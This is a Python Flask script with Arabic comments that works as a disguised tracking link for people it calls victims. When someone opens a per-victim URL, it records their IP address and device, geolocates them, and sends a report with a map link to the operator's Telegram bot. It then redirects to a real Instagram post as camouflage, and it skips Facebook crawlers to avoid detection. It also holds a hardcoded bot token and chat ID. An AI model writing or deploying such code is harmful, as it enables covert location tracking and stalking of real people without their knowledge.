from flask import Flask, request
import requests

app = Flask(__name__)

# بياناتك لكي تصلك النتائج فوراً
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/<victim_id>') # استخدام معرف فريد لكل ضحية
def dns_trap(victim_id):
    # جلب الـ IP الذي طلب الصفحة
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')

    # دراسة البروتوكول: إذا كان الطلب من هاتف (وليس بوت فيسبوك)
    if not any(bot in ua.lower() for bot in ['facebook', 'bot', 'amazon']):
        try:
            r = requests.get(f'http://ip-api.com/json/{ip}').json()
            # رابط خريطة دقيق لبرج الاتصال في عدن
            map_link = f"https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}"
            
            report = (
                f"🎯 <b>صيد عبر ثغرة DNS (ضحية: {victim_id})</b>\n"
                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
                f"🏢 <b>المزود:</b> {r.get('isp')}\n"
                f"📱 <b>الجهاز:</b> {ua[:50]}...\n"
                f"📍 <a href='{map_link}'>موقع الضحية في عدن</a>"
            )
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": report, "parse_mode": "HTML"})
        except: pass

    # تحويل لصفحة إنستغرام الحقيقية للتمويه
    return f"<script>window.location.href='https://instagram.com/p/{victim_id}';</script>"

if __name__ == '__main__':
    app.run()
